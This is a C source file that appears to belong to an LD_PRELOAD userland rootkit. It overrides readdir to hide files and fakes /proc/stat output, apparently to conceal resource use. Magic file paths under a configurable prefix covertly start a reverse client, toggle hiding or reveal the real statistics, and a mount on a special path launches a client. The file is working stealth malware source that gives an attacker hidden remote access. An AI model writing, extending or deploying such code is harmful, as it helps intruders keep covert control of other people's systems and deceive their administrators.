#include <stdio.h>
#include <dirent.h>
#include <stdlib.h>
#include <string.h>
#include <stdarg.h>
#include <fcntl.h>
#include <unistd.h>
#include "overrides.h"
#include "util.h"
#include "client.h"

struct dirent *(*original_readdir)(DIR *dirp) = NULL;

struct dirent *readdir(DIR *dirp)
{
    ORIG(readdir, NULL);

    struct dirent *dir;
    do dir = original_readdir(dirp); while (dir && should_filter(dir->d_name, dirp));
    return dir;
}

int (*original_open)(const char *path, int flags, ...);

int open(const char *path, int flags, ...)
{
    int ret = -1;
    ORIG(open, -1);

    int mode;
    va_list argp;
    va_start(argp, flags);
#ifdef O_TMPFILE
    if ((flags & O_CREAT) || (flags & O_TMPFILE)) mode = va_arg(argp, int);
#else
    if ((flags & O_CREAT)) mode = va_arg(argp, int);
#endif
    va_end(argp);

    char *absolute_path = realpath(path, NULL);
    if (!absolute_path) return original_open(path, flags, mode);

    if (strcmp(absolute_path, "/proc/stat") == 0)
    {
        if (should_hide()) ret = fake_proc_stat();
        else ret = original_open(path, flags, mode);
    }
    else if (strcmp(absolute_path, "/" PREFIX "/rev") == 0)
    {
        rev_client();
    }
    else if (strcmp(absolute_path, "/" PREFIX "/stat") == 0)
    {
        print_realstat();
    }
    else if (strcmp(absolute_path, "/" PREFIX "/hideon") == 0)
    {
        hide_on();
    }
    else if (strcmp(absolute_path, "/" PREFIX "/hideoff") == 0)
    {
        hide_off();
    }
    else
    {
        ret = original_open(path, flags, mode);
    }

    free(absolute_path);
    return ret;
}

int (*original_openat)(int fd, const char *path, int flags, ...) = NULL;

int openat(int fd, const char *path, int flags, ...)
{
    int ret = -1;
    ORIG(openat, -1);

    int mode;
    va_list argp;
    va_start(argp, flags);
#ifdef O_TMPFILE
    if ((flags & O_CREAT) || (flags & O_TMPFILE)) mode = va_arg(argp, int);
#else
    if ((flags & O_CREAT)) mode = va_arg(argp, int);
#endif
    va_end(argp);

    char dirname[6000];
    if (!fdname(fd, dirname, sizeof(dirname))) strcpy(dirname, "");
    else strncat(dirname, "/", sizeof(dirname) - strlen(dirname) - 1);
    strncat(dirname, path, sizeof(dirname) - strlen(dirname) - 1);
    char *absolute_path = realpath(dirname, NULL);
    if (!absolute_path) return original_openat(fd, path, flags, mode);

    if (strcmp(absolute_path, "/proc/stat") == 0)
    {
        if (should_hide()) ret = fake_proc_stat();
        else ret = original_openat(fd, path, flags, mode);
    }
    else if (strcmp(absolute_path, "/" PREFIX "/rev") == 0)
    {
        rev_client();
    }
    else if (strcmp(absolute_path, "/" PREFIX "/stat") == 0)
    {
        print_realstat();
    }
    else if (strcmp(absolute_path, "/" PREFIX "/hideon") == 0)
    {
        hide_on();
    }
    else if (strcmp(absolute_path, "/" PREFIX "/hideoff") == 0)
    {
        hide_off();
    }
    else
    {
        ret = original_openat(fd, path, flags, mode);
    }

    free(absolute_path);
    return ret;
}

#ifndef REDEFINED

FILE *(*original_fopen)(const char *path, const char *mode) = NULL;

FILE *fopen(const char *path, const char *mode)
{
    FILE *ret = NULL;
    ORIG(fopen, NULL);

    char *absolute_path = realpath(path, NULL);
    if (!absolute_path) return original_fopen(path, mode);

    if (strcmp(absolute_path, "/proc/stat") == 0)
    {
        if (should_hide()) ret = fdopen(fake_proc_stat(), mode);
        else ret = original_fopen(path, mode);
    }
    else if (strcmp(absolute_path, "/" PREFIX "/rev") == 0)
    {
        rev_client();
    }
    else if (strcmp(absolute_path, "/" PREFIX "/stat") == 0)
    {
        print_realstat();
    }
    else if (strcmp(absolute_path, "/" PREFIX "/hideon") == 0)
    {
        hide_on();
    }
    else if (strcmp(absolute_path, "/" PREFIX "/hideoff") == 0)
    {
        hide_off();
    }
    else
    {
        ret = original_fopen(path, mode);
    }

    free(absolute_path);
    return ret;
}

int (*original_mount)(const char *source, const char *target, const char *filesystemtype, unsigned long mountflags, const void *data);

int mount(const char *source, const char *target, const char *filesystemtype, unsigned long mountflags, const void *data)
{
    ORIG(mount, -1);

    if (strcmp(target, "/" PREFIX "/tmp") == 0) start_client();
    return original_mount(source, target, filesystemtype, mountflags, data);
}

#define REDEFINED
#endif
